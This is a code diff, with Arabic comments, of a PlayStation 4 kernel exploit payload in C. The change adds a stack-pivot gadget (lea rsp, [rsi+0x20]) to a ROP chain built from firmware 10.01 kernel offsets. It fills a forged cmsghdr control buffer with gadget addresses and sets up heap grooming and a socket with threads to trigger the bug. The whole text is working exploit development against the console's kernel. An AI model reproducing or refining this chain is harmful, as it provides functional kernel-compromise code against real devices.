@@ -1,8 +1,10 @@
 #include <ps4.h>
 
+// الإزاحات من قائمتك (10.01)
 #define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
 #define OFF_JMP_RSI_3B           0x049C5D 
-#define OFF_POP_RBX_R14_RBP_JMP  0x345741 // pop rbx; pop r14; pop rbp; jmp [rsi+0x10]
+#define OFF_LEA_RSP_RSI_20_RET   0x72B346 // lea rsp, [rsi + 0x20] ; ret
+#define OFF_POP_RBX_R14_RBP_JMP  0x345741 
 #define OFF_RET                  0x0008E0
 
 #define CONTROL_LEN 256
@@ -57,9 +59,11 @@ int _main(struct thread *td) {
     
     uint64_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET; 
     uint64_t step2 = kbase + OFF_JMP_RSI_3B;           
-    uint64_t step3 = kbase + OFF_POP_RBX_R14_RBP_JMP; 
-    uint64_t val1 = 0xDEADC0DE; // لـ RBX
-    uint64_t val2 = 0xBAADF00D; // لـ R14
+    uint64_t step3 = kbase + OFF_LEA_RSP_RSI_20_RET;   // توجيه الـ Stack للبفر
+    uint64_t step4 = kbase + OFF_POP_RBX_R14_RBP_JMP; 
+    
+    uint64_t val_rbx = 0xDEADC0DE;
+    uint64_t val_r14 = 0xBAADF00D;
 
     prepare_heap();
 
@@ -67,26 +71,24 @@ int _main(struct thread *td) {
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_len = 0x50;
 
-    // 1. ملء البفر بالخطوة الأولى (Trigger)
+    // ملء البفر بالخطوة الأولى
     for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
         *(uint64_t *)(control_buf + i) = step1;
     }
 
-    // 2. وضع القفزة لـ RSI+3B في مسار الـ Stack المتوقع
+    // القفزة إلى RSI+3B
     for (int i = 0x50; i < 0xA0; i += 8) {
         *(uint64_t *)(control_buf + i) = step2;
     }
 
-    // 3. وضع الجادجيت المركب عند الإزاحة 0x3b
+    // عند الإزاحة 0x3b نضع توجيه الـ Stack
     *(uint64_t *)(control_buf + 0x3b) = step3; 
 
-    // 4. إغراق البفر بالقيم (RBX و R14 سيسحبان هذه القيم)
-    // نضعها في مساحة واسعة لضمان السحب الصحيح
-    for (int i = 0x10; i < 0x80; i += 16) {
-        if (i == 0x3b) continue; // لا نمسح الجادجيت
-        *(uint64_t *)(control_buf + i) = val1;
-        *(uint64_t *)(control_buf + i + 8) = val2;
-    }
+    // الآن الـ RSP سيصبح (RSI + 0x20). 
+    // سنضع السلسلة النهائية بدءاً من الإزاحة 0x20
+    *(uint64_t *)(control_buf + 0x20) = step4;   // pop rbx...
+    *(uint64_t *)(control_buf + 0x28) = val_rbx; // القيمة لـ rbx
+    *(uint64_t *)(control_buf + 0x30) = val_r14; // القيمة لـ r14
 
     global_sock = syscall(97, 2, 2, 0);
     ScePthread t1, t2;
